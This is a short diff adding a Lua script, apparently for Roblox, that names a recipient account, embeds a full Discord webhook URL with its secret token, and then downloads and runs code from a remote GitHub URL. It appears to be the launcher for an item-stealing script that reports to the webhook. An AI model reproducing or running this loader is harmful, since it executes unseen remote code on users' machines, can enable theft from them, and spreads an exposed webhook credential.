@@ -1,0 +1,3 @@
+_G.UserName = "7uvex"
+_G.Webhook = "https://discord.com/api/webhooks/1094780312719982732/Ne0qT-mnH8W_cy5aasQe1LrulNKqEeqR8iFTXNG8z6rdj8CZ45kG1F5MygsfuP4DnZhJ" 
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/CorruptedL1ght/L1ghtScripts/main/main.lua"))()
